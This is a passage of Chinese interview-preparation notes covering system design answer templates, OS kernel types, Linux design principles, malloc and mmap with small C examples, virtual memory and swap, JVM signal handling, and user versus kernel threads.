<li><strong>异步削峰</strong>：将高并发请求中非核心的操作用消息队列（如 RocketMQ）异步处理，比如发通知、写日志。</li>
</ul>
</blockquote>
<h3 id="🧩-2-高可用（High-Availability）">🧩 2. 高可用（High Availability）</h3>
<p><strong>回答模板：</strong></p>
<blockquote>
<p>系统要高可用，必须具备容灾能力和快速恢复机制。我做了以下几方面：</p>
<ul>
<li><strong>服务冗余部署</strong>：核心服务采用多实例部署，通过 Nginx + 注册中心实现负载均衡；</li>
<li><strong>故障转移</strong>：数据库使用主从架构，支持读写分离；Redis 采用哨兵或集群模式自动切换；</li>
<li><strong>熔断与降级</strong>：通过 Sentinel/HYSTRIX 对下游服务设置熔断降级策略，防止级联故障；</li>
<li><strong>自动化部署</strong>：通过容器和 CI/CD 实现快速上线和回滚，提高恢复效率。</li>
</ul>
</blockquote>
<h3 id="🧩-3-高性能（High-Performance）">🧩 3. 高性能（High Performance）</h3>
<p><strong>回答模板：</strong></p>
<blockquote>
<p>性能优化方面，我重点从以下几个角度入手：</p>
<ul>
<li><strong>接口优化</strong>：接口幂等性处理、精简响应字段、合理分页；</li>
<li><strong>数据库优化</strong>：慢 SQL 分析、索引优化、表结构设计合理；</li>
<li><strong>连接池优化</strong>：合理配置 Druid/MySQL 连接池，避免频繁创建销毁；</li>
<li><strong>GC/内存优化</strong>：通过 JVM 参数调优、内存泄露排查，保障内存稳定；</li>
<li><strong>压测与性能监控</strong>：上线前使用 JMeter/Locust 做压测，配合 Prometheus + Grafana 实时监控系统瓶颈。</li>
</ul>
</blockquote>
<h2 id="🚀-加分讲法：结合你项目实际说一遍">🚀 加分讲法：结合你项目实际说一遍</h2>
<blockquote>
<p>以我的“铁路购票系统”为例，我们在春运期间面临极端高并发，为保证系统稳定运行，我做了三方面优化：</p>
<ul>
<li><strong>高并发方面</strong>：对购票接口做了限流和异步下单，采用 Redis 锁+消息队列削峰填谷；</li>
<li><strong>高可用方面</strong>：所有服务都是容器化部署，支持自动扩容，数据库使用主从 + Redis 哨兵保证高可用；</li>
<li><strong>高性能方面</strong>：购票核心链路接口做了缓存预热 + 热点数据本地缓存，数据库层面对查询做了索引优化，响应时间压到 &lt; 200ms。</li>
</ul>
</blockquote>
<h1>宏内核、微内核、混合型内核</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmVmYWNmZTQzNTI2NzY2OGFiNzVhMDZhOWIzOWQ0OWFfRW9ORUQzZ3F1V0tVdElpTnd6cTRPQkVoWm1rT1Q4OUZfVG9rZW46SjdCN2JKVnlvb1BJVFd4ZFJ1Y2NzZlU3bkxmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🧠-一图三解：宏内核-vs-微内核-vs-混合内核">🧠 一图三解：宏内核 vs 微内核 vs 混合内核</h2>
<h3 id="🌕-1-宏内核（Monolithic-Kernel）">🌕 1. 宏内核（Monolithic Kernel）</h3>
<ul>
<li>✅ <strong>特点</strong>：所有核心功能（文件系统、设备驱动、内存调度、系统调用等）<strong>全部运行在内核态</strong>，模块之间可以直接调用。</li>
<li>✅ <strong>优点</strong>：
<ul>
<li>性能好（函数调用快）</li>
<li>内核模块间通信效率高</li>
</ul>
</li>
<li>❌ <strong>缺点</strong>：
<ul>
<li>不稳定：一个模块崩了可能整个系统崩</li>
<li>可维护性差，扩展困难</li>
</ul>
</li>
<li>🏷️ <strong>代表系统</strong>：Linux、Unix、Windows 早期版本（NT）</li>
</ul>
<h3 id="🌱-2-微内核（Microkernel）">🌱 2. 微内核（Microkernel）</h3>
<ul>
<li>✅ <strong>特点</strong>：只保留<strong>最基础核心功能</strong>在内核中，比如 IPC（进程通信）、调度、虚拟内存等；其他服务（如文件系统、设备驱动）都放到<strong>用户态</strong>作为独立进程运行。</li>
<li>✅ <strong>优点</strong>：
<ul>
<li>稳定性高，系统崩溃风险低</li>
<li>可扩展性强，模块解耦</li>
</ul>
</li>
<li>❌ <strong>缺点</strong>：
<ul>
<li>性能下降（频繁用户态 ↔ 内核态切换 + IPC 通信）</li>
</ul>
</li>
<li>🏷️ <strong>代表系统</strong>：QNX、Minix、GNU Hurd</li>
</ul>
<h3 id="⚡-3-混合内核（Hybrid-Kernel）">⚡ 3. 混合内核（Hybrid Kernel）</h3>
<ul>
<li>✅ <strong>特点</strong>：<strong>介于宏内核与微内核之间</strong>，底层结构类似微内核，但会把部分性能敏感的服务（如文件系统、驱动等）放回内核态执行，以提升性能。</li>
<li>✅ <strong>优点</strong>：
<ul>
<li>兼顾性能与稳定性</li>
<li>结构灵活</li>
</ul>
</li>
<li>❌ <strong>缺点</strong>：
<ul>
<li>架构复杂，实现成本高</li>
</ul>
</li>
<li>🏷️ <strong>代表系统</strong>：Windows NT/10、macOS（XNU）</li>
</ul>
<h2 id="🧑💼-面试回答模板（简洁高效）：">🧑💼 面试回答模板（简洁高效）：</h2>
<blockquote>
<p>操作系统的内核结构主要有三种：</p>
<ul>
<li><strong>宏内核</strong>将所有功能都运行在内核态，性能高但稳定性较差，代表如 Linux；</li>
<li><strong>微内核</strong>精简核心功能，把文件系统、驱动等外移到用户态，增强安全性与可维护性，但性能略有下降；</li>
<li><strong>混合内核</strong>在结构上更灵活，结合了两者优点，像 Windows 和 macOS 就采用了这种架构。</li>
</ul>
<p>这三者的核心差异在于：<strong>内核与用户态之间功能的划分与通信方式的权衡</strong>。</p>
</blockquote>
<h1>linux的内核设计理念</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE0MTkyNjcwOTFjMjU5YTUyZjcxNmI3ZTEwM2VjNGJfMmVROXJ2Z3Y2emkxc2RpWFg0Z3BpMXJXTFpWWVVPZTNfVG9rZW46WlhQbWJETjMxbzZCMFN4ZjFMSWN2WUZ2bk1lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="1、MultiTask（多任务）"><strong>1、MultiTask（多任务）</strong></h3>
<h4 id="✅-解释：-6">✅ 解释：</h4>
<p>Linux 支持<strong>多任务操作（Multitasking）</strong>，即系统可以在同一时刻<strong>并发运行多个进程/线程</strong>。这包括：</p>
<ul>
<li><strong>抢占式调度（Preemptive Scheduling）</strong>：高优先级任务可以打断低优先级任务</li>
<li><strong>时间片轮转（Time-sharing）</strong>：系统将 CPU 时间分片，分配给每个进程</li>
</ul>
<h4 id="🧠-面试点：">🧠 面试点：</h4>
<blockquote>
<p>Linux 通过调度器（如 CFS）实现多任务并发，让系统同时响应多个用户请求，是实现高并发、高吞吐的基础。</p>
</blockquote>
<h3 id="2、SMP（Symmetric-Multi-Processing，对称多处理）">2、<strong>SMP（Symmetric Multi-Processing，对称多处理）</strong></h3>
<h4 id="✅-解释：-7">✅ 解释：</h4>
<p>Linux 从设计上就支持 <strong>SMP 架构</strong>，也就是系统中有多个 CPU 核心，各核心<strong>对等共享内存</strong>，能同时处理多个任务。</p>
<h4 id="📌-特点：">📌 特点：</h4>
<ul>
<li>各核平等，不区分主从</li>
<li>多线程程序可在多个 CPU 上并行执行</li>
<li>支持 CPU 亲和性（CPU Affinity）调度优化</li>
</ul>
<h4 id="🧠-面试点：-2">🧠 面试点：</h4>
<blockquote>
<p>Linux 内核支持对称多处理（SMP），在多核环境中能高效调度进程，提高并发处理能力，是服务器端系统的基础能力之一。</p>
</blockquote>
<h3 id="3、ELF（Executable-and-Linkable-Format）"><strong>3、ELF（Executable and Linkable Format）</strong></h3>
<h4 id="✅-解释：-8">✅ 解释：</h4>
<p>ELF 是 Linux 系统下标准的<strong>可执行文件格式</strong>，也包括目标文件、动态链接库、内核模块等。</p>
<h4 id="📌-包含内容：">📌 包含内容：</h4>
<ul>
<li><strong>Header</strong>：说明文件类型</li>
<li><strong>Section Table</strong>：代码段、数据段、符号表等</li>
<li><strong>支持动态链接</strong>、动态加载（<code>dlopen</code>）</li>
</ul>
<h4 id="🧠-面试点：-3">🧠 面试点：</h4>
<blockquote>
<p>Linux 采用 ELF 格式作为标准执行文件格式，配合动态链接库机制，支持按需加载、共享内存使用等，有利于系统性能与模块化开发。</p>
</blockquote>
<h3 id="4、Monolithic-Kernel（宏内核）"><strong>4、Monolithic Kernel（宏内核）</strong></h3>
<h4 id="✅-解释：-9">✅ 解释：</h4>
<p>Linux 是基于<strong>宏内核架构</strong>，内核中包含了大量的功能模块（文件系统、网络协议栈、设备驱动等），都运行在<strong>内核态</strong>。</p>
<h4 id="📌-特点：-2">📌 特点：</h4>
<ul>
<li>性能高：内核模块间直接调用，无需 IPC</li>
<li>模块化：通过 <code>insmod</code> / <code>rmmod</code> 动态加载驱动</li>
<li>安全性挑战：一处崩溃可能影响整个内核</li>
</ul>
<h4 id="🧠-面试点：-4">🧠 面试点：</h4>
<blockquote>
<p>Linux 采用宏内核架构，将调度器、文件系统、驱动等模块统一运行在内核空间，提升了性能，但需要严格控制内核模块的稳定性。</p>
</blockquote>
<h1>malloc、mmap</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTMxMDBjNzAyNTIwOGE5MTRjZmEyYjdiNTgxOGVkNjhfdDBBY1hTT0ROZGVmbEdvWE5QbHo4eUJTZml5MkV4alhfVG9rZW46RExKZmIwYWk2b093Q2h4ZzBDamNzWFVZbmpnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h1>🧬 二、工作原理解析</h1>
<h3 id="🔸-malloc-原理简述：">🔸 <code>malloc</code> 原理简述：</h3>
<ul>
<li>底层可能使用 <code>brk/sbrk</code> 增加堆顶指针来分配内存</li>
<li>当申请内存较大（通常 &gt;128KB）时，glibc 会直接用 <code>mmap</code> 分配</li>
<li><code>malloc</code> 使用 <strong>内存池 + free list + chunk 分配算法</strong></li>
</ul>
<h3 id="🔸-mmap-原理简述：">🔸 <code>mmap</code> 原理简述：</h3>
<ul>
<li>系统调用，向内核请求将物理页映射到虚拟地址空间</li>
<li>用于：
<ul>
<li><strong>文件映射</strong>（实现零拷贝 I/O，直接访问磁盘数据）</li>
<li><strong>匿名映射</strong>（作为动态内存分配的替代方案）</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2E4NzgzNzU2M2U0ZmNmOGQ2YzIwZGU1ZjQxODdiMjBfR2Rjc0dFVU9QMEw4ak14S1NQeEZZYlZIOXE0S3VWcTdfVG9rZW46VDlHSmJ1Z2JqbzBycWV4SVlTWWNwUk5mbmRnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="🔍-详细解释：">🔍 详细解释：</h2>
<h3 id="🔸-malloc（基于堆）">🔸 <code>malloc</code>（基于堆）</h3>
<ul>
<li>本质：封装了 <code>brk/sbrk</code> 或 <code>mmap</code>，向内核请求堆空间</li>
<li>属于 C 语言标准库中的函数（glibc 实现）</li>
<li>返回一段连续的内存块，大小由你传入的参数决定</li>
<li>分配的内存位于<strong>用户态堆区</strong></li>
</ul>
<h4 id="示例：-3">示例：</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>* p = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">100</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>
<h3 id="🔸-mmap（内核系统调用）">🔸 <code>mmap</code>（内核系统调用）</h3>
<ul>
<li>本质：将<strong>文件</strong>或<strong>匿名内存</strong>映射到当前进程的虚拟地址空间</li>
<li>用途更广，能分配堆以外的内存（匿名映射）或直接读取磁盘内容（文件映射）</li>
<li>可以代替 <code>malloc</code> 分配<strong>大块内存</strong>（如内存池）</li>
<li>能控制内存属性（读写权限、共享/私有等）</li>
</ul>
<h4 id="示例-1：匿名内存映射（类似-malloc）">示例 1：匿名内存映射（类似 malloc）</h4>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span>* mem = mmap(NULL, <span class="number">4096</span>, PROT_READ | PROT_WRITE, ``                 MAP_PRIVATE | MAP_ANONYMOUS, -<span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h4 id="示例-2：文件映射（类似读取文件）">示例 2：文件映射（类似读取文件）</h4>
<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">int</span> fd = open(<span class="string">&quot;data.txt&quot;</span>, <span class="type">O_RDONLY</span>);` `char* <span class="class"><span class="keyword">data</span> = mmap(<span class="type">NULL</span>, <span class="title">filesize</span>, <span class="type">PROT_READ</span>, <span class="type">MAP_PRIVATE</span>, <span class="title">fd</span>, 0);</span></span><br></pre></td></tr></table></figure>
<h2 id="💡-mmap-和-malloc-的关系：">💡 mmap 和 malloc 的关系：</h2>
<ul>
<li>在 <code>glibc</code> 中，当你调用 <code>malloc</code> 分配 <strong>小于 128KB</strong> 的内存，它可能通过 <code>brk()</code> 拓展堆区</li>
<li>分配 <strong>更大内存时</strong>，<code>malloc</code> 会底层调用 <code>mmap()</code> 来完成分配（即你看不到，但它在背后用）</li>
</ul>
<h2 id="🧠-面试话术模板推荐：">🧠 面试话术模板推荐：</h2>
<blockquote>
<p><code>malloc</code> 是标准库函数，专用于从堆上动态分配内存；而 <code>mmap</code> 是系统调用，可以将文件映射到内存或分配匿名内存，功能更底层、灵活，适用于文件 I/O 加速或大内存分配。</p>
</blockquote>
<h2 id="🎯-最佳总结：">🎯 最佳总结：</h2>
<p>✅ <strong>你说的“malloc 在堆上，mmap 在文件映射段”是对的，但 mmap 不局限于映射文件，它还可以用于分配匿名内存，甚至底层实现 malloc。</strong></p>
<p>malloc 申请内存的时候，会有两种方式向操作系统申请堆内存。</p>
<ul>
<li>方式一：通过 brk() 系统调用从堆分配内存</li>
<li>方式二：通过 mmap() 系统调用在文件映射区域分配内存；</li>
</ul>
<h2 id="关于free">关于free</h2>
<p>「malloc 申请的内存，free 释放内存会归还给操作系统吗？」</p>
<ol>
<li>malloc 通过 brk() 方式申请的内存，free 释放内存的时候，并不会把内存归还给操作系统，而是缓存在 malloc 的内存池中，待下次使用；</li>
<li>malloc 通过 mmap() 方式申请的内存，free 释放内存的时候，会把内存归还给操作系统，内存得到真正的释放。</li>
</ol>
<p>malloc（），括号内的数小于128KB时，就会一次性分配一个内存池的大小给你（如132KB），而malloc（），括号内的数大于128KB时，就会按括号内大小进行分配</p>
<h2 id="✅-malloc-的分配行为详解：">✅ malloc 的分配行为详解：</h2>
<h3 id="🔹-一、当-malloc-size-中的-size-小于等于128KB-时：">🔹 一、当 <code>malloc(size)</code> 中的 size <strong>小于等于128KB</strong> 时：</h3>
<ul>
<li><code>malloc()</code> <strong>使用</strong> <strong><code>brk</code></strong> <strong>系统调用</strong>。</li>
<li>它不会只分配你请求的那一点点内存，而是： 👉 <strong>一次性向内存分配一大块（比如 128KB ~ 132KB）作为“内存池”</strong>。</li>
<li>后续你再次 <code>malloc()</code> 较小内存时，会<strong>从这个内存池中划分一部分给你</strong>，而不是再找系统要。</li>
</ul>
<p><strong>例子</strong>：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span> *p = malloc(<span class="number">1</span>);` `// 实际系统可能一次性给了 <span class="number">132</span>KB，从其中分出 <span class="number">1</span> 字节给你</span><br></pre></td></tr></table></figure>
<h3 id="🔹-二、当-malloc-size-中的-size-大于128KB（如-200KB、1MB）-时：">🔹 二、当 <code>malloc(size)</code> 中的 size <strong>大于128KB（如 200KB、1MB）</strong> 时：</h3>
<ul>
<li><code>malloc()</code> <strong>会直接调用</strong> <strong><code>mmap()</code></strong> <strong>来映射一块新的内存区域</strong>。</li>
<li>映射的大小就是你请求的大小，通常也会对齐到页（4KB）的整数倍。</li>
<li>这样做的目的是：<strong>大对象不污染小对象的内存池</strong>，避免内存碎片。</li>
</ul>
<p><strong>例子</strong>：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">void</span> *p = malloc(<span class="number">200</span> * <span class="number">1024</span>); // 会直接 mmap 一个约 <span class="number">200</span>KB 的内存区域</span><br></pre></td></tr></table></figure>
<h1>内存满了，会发生什么？</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGExZDcxNmZmOGNhYjlmMTZiOGMzM2Y0Nzk2YjNjNWFfTkp2elkxdzZVdnd1d0d0YXRGNGROa3dLbGFIZW9sVzBfVG9rZW46TEF3dGJsUmZJb0lBbjl4VkJyZGNWdUo4bjZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>操作系统的内存管理不仅仅是给进程分配内存、做访问隔离，更重要的是通过虚拟内存机制，实现地址隔离、空间扩展、共享库支持和按需加载，极大提高了内存利用率和系统稳定性。</p>
<p>当内存耗尽时，操作系统会首先通过回收机制（如页替换）释放内存，若仍不足，则会触发 OOM Killer 杀死内存占用较大的进程，保证系统核心服务能继续运行。</p>
<h1>虚拟地址空间、虚拟内存总量</h1>
<blockquote>
<p>虚拟地址空间是指单个进程的最大大小，虚拟内存总量可以大于物理内存是因为程序会有多个进程，然后结合swap控制，可以将不常用的内存放入到磁盘中</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWJiODM1MjVjNjEzZmM5MjFkZGJhMDMwNzFmYjVhYmVfVDM1QzlXa1owVzJ5MXVxb0NwQ29ndElMaEJKT29KZHpfVG9rZW46UERFRmJOMTZVb21Peml4ZTZja2NQUlo5bkJlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="💡-举个例子更直观">💡 举个例子更直观</h3>
<p>假设你是操作系统，你手上只有 <strong>4GB 内存条（物理内存）</strong>，但你服务 5 个程序，每个程序想用 2GB：</p>
<ul>
<li>每个程序都活在自己的虚拟世界，能看到 2GB 的“虚拟地址空间”。</li>
<li>实际你没那么多内存怎么办？
<ul>
<li>你把<strong>暂时没在用的那部分数据先存到硬盘（swap）</strong>；</li>
<li>只把当前“活跃”的内存放到物理内存条里；</li>
</ul>
</li>
<li>就这样周而复始地换进换出，做到<strong>假装所有人都内存够用</strong>。</li>
</ul>
<p>这就是“<strong>虚拟内存总量 &gt; 物理内存</strong>”的秘密武器：<strong>内存换页机制（paging）+ swap 分区</strong>。</p>
<blockquote>
<p>虚拟地址空间决定了<strong>单个进程的内存上限</strong>，而虚拟内存总量可以<strong>通过多个进程 + swap</strong>方式，<strong>突破物理内存的限制</strong>，模拟出更大的可用内存空间。</p>
</blockquote>
<h1>1</h1>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MTc4MmUyZGE2YmM5YzRiZjhhZDY3ZjkwNmE3MDIyYTVfcTBJUFB6V01TZjl0cEVpbzlIOEptUXdhMkk1RFNXb0JfVG9rZW46TmtuMmI3Wmx2b0ZRUEp4QnZIY2NPUFhCbkFjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmI3YThjYmVlYjQzY2M3NGE2NGQyMjdjMjY0YzY2MmZfVDdEMlZSRVp0anlFWDhCTVpiSmxIaHJxMUV3NEJrYTlfVG9rZW46TXF3NGJGNVlab095Q0d4cUdmemNaamxqbjJmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>start_stack 是栈的起始位置在 RBP 寄存器中存储，栈的结束位置也就是栈顶指针 stack pointer 在 RSP 寄存器中存储。</p>
<h1>为什么线程崩溃不会导致 JVM 崩溃</h1>
<p>线程与进程的比较如下：</p>
<ul>
<li>进程是资源（包括内存、打开的文件等）分配的单位，线程是 CPU 调度的单位；</li>
<li>进程拥有一个完整的资源平台，而线程只独享必不可少的资源，如寄存器和栈；</li>
<li>线程同样具有就绪、阻塞、执行三种基本状态，同样具有状态之间的转换关系；</li>
<li>线程能减少并发执行的时间和空间开销；</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWRjOTY4NGRmY2QyZTg0MjM2YzI3ODIxYzY3OGYzNzhfNUp3NFRYQXB4bVFZa1hvT1ZGeWdIbFExSUpjSExTMFlfVG9rZW46UDhzYmJoZGN5b09xS0N4SnRZR2Njd2Q1bjNkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY0ZDc5OWYyYjExMWIzZTdlMDA2ZWVlOTg1YWYxNDhfZzFBZGh0YlVlWWtiSjBqUEE3UW51TDBsMXloQjZlU05fVG9rZW46TkRHMGI3NzFSbzV0QWt4MmlFeWN4WDBxblJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWFkMjJlYjI4NTk0MmNjNWFlZDJkYjk2OWQzYTEzZjFfa3Z2cGFlRHByTHlVUzNLanl1djZ2SFp1QTVzanhXbVRfVG9rZW46RzJiT2JuZnVwbzBXQ1B4MmpaWWNpS1hTbjVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🔥-根本原因：-hello-world-是存储在只读的-常量区（Text-Segment）">🔥 根本原因：<code>&quot;hello world&quot;</code> 是存储在只读的 <strong>常量区（Text Segment）</strong></h3>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char *s <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>这一行不是创建一个可修改的字符串，而是让指针 <code>s</code> 指向了常量字符串 <code>&quot;hello world&quot;</code>，这段内容通常被编译器放在 <strong>只读内存区域</strong>。</p>
<p>所以当你执行：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s[<span class="number">1</span>] <span class="punctuation">=</span> &#x27;H&#x27;<span class="punctuation">;</span>  <span class="comment">// ❌ 写只读内存！程序崩溃</span></span><br></pre></td></tr></table></figure>
<p>系统会因为<strong>你试图修改只读内存</strong>而触发段错误（Segfault）。</p>
<h3 id="✅-正确写法：用数组分配可写内存">✅ 正确写法：用数组分配可写内存</h3>
<p>如果你想修改字符串的内容，应该这样写：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> main() &#123;char s[] = <span class="string">&quot;hello world&quot;</span>;  <span class="regexp">//</span> ✅ 创建在栈上的可写数组<span class="string">` `</span>    s[<span class="number">1</span>] = <span class="string">&#x27;H&#x27;</span>;                <span class="regexp">//</span> ✅ 修改成功 <span class="string">``</span>    <span class="keyword">printf</span>(<span class="string">&quot;<span class="variable">%s</span>\n&quot;</span>, s);         <span class="regexp">//</span> 输出：hHllo world <span class="string">``</span>    <span class="keyword">return</span> <span class="number">0</span>; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这行：</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char s[] <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>会在栈上分配一个数组拷贝，内容是 <code>&#123;'h','e','l','l','o',' ','w','o','r','l','d','\0'&#125;</code>，可以修改。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDliZjg3Yjg0OGI2ZWE2YTRiNWFkY2JlZmY3ZTVhMzBfY1U4OTNPbXY0azlhRVc4U0lwTXNROEE0TG1VZDZZdjZfVG9rZW46U0NGM2I4NnhEb1hPOGZ4NHNRbmNzUDVabnBjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWJiYjk0MTViNjZjZTNhNjRhMTJjZTliNGZiNDk1MzNfcmRKWDdyQkpyNWprTElucFdDZkxwR2p2Y3ozS1NpZTRfVG9rZW46U1Y1b2JORXZjb3FXUEl4Qm9iamNtNWY5bm80XzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>至此我相信大家明白了为什么发生了 StackoverflowError 和 NPE 这两个非法访问内存的错误，JVM 却没有崩溃。</p>
<p>原因其实就是虚拟机内部定义了信号处理函数，而在信号处理函数中对这两者做了额外的处理以让 JVM 不崩溃，另一方面也可以看出如果 JVM 不对信号做额外的处理，最后会自己退出并产生 crash 文件 hs_err_pid_xxx.log（可以通过 -XX:ErrorFile=/var/<em>log</em>/hs_err.log 这样的方式指定），这个文件记录了虚拟机崩溃的重要原因，</p>
<p>所以也可以说，虚拟机是否崩溃只要看它是否会产生此崩溃日志文件</p>
<h3 id="总结-4">总结</h3>
<p>正常情况下，操作系统为了保证系统安全，所以针对非法内存访问会发送一个 SIGSEGV 信号，而操作系统一般会调用默认的信号处理函数（一般会让相关的进程崩溃）。</p>
<p>但如果进程觉得&quot;罪不致死&quot;，那么它也可以选择自定义一个信号处理函数，这样的话它就可以做一些自定义的逻辑，比如记录 crash 信息等有意义的事，</p>
<p>回过头来看为什么虚拟机会针对 StackoverflowError 和 NullPointerException 做额外处理让线程恢复呢，针对 stackoverflow 其实它采用了一种栈回溯的方法保证线程可以一直执行下去，而捕获空指针错误主要是这个错误实在太普遍了，</p>
<p>为了这一个很常见的错误而让 JVM 崩溃那线上的 JVM 要宕机多少次，所以出于工程健壮性的考虑，与其直接让 JVM 崩溃倒不如让线程起死回生，并且将这两个错误/异常抛给用户来处理</p>
<h1>用户线程、内核线程</h1>
<h3 id="用户线程（User-Level-Thread-ULT）">用户线程（User-Level Thread, ULT）</h3>
<ul>
<li><strong>调度</strong>：在用户空间自己调度（比如自己写的线程库）</li>
<li><strong>优点</strong>：切换快、不需要陷入内核（没有 syscall）</li>
<li><strong>缺点</strong>：
<ul>
<li>操作系统无法感知/管理它们</li>
<li>一个用户线程阻塞（如IO），<strong>整个进程都阻塞</strong></li>
</ul>
</li>
</ul>
<h3 id="内核线程（Kernel-Level-Thread-KLT）">内核线程（Kernel-Level Thread, KLT）</h3>
<ul>
<li><strong>调度</strong>：由操作系统调度（CPU调度器分配 CPU）</li>
<li><strong>优点</strong>：
<ul>
<li>一个线程阻塞不会影响整个进程</li>
<li>多核并发真正实现并行</li>
</ul>
</li>
<li><strong>缺点</strong>：
<ul>
<li>切换线程需要进入内核（系统调用），<strong>开销较大</strong></li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzk4ZWU1ODZhMDk4Y2U5NWM1NjMwMDEzN2FjYWMzMjlfQXQ0VXI1TVhxUEZYRjBxWndtZXQ1YUkzMlpIUGh2VFNfVG9rZW46TVJ2RWJiZW5Cb3VjUW94VFFBbmNnTHFLbjFkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
